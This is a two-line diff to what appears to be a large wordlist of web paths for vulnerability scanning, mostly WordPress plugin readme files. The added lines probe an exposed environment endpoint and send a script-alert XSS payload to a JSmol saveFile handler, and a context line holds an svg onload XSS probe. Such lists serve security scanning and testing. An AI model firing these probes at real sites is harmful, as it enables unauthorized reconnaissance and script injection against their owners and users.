@@ -12456,3 +12456,5 @@ request?info=<svg onload=alert(
 /wp-content/plugins/esselinknu-settings/readme.txt
 /wp-content/plugins/sexy-contact-form/readme.txt
 /wp-content/plugins/homerunner-smartcheckout/readme.txt
+/engine-ui/0.0.0.0:4040/environment/
+/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html
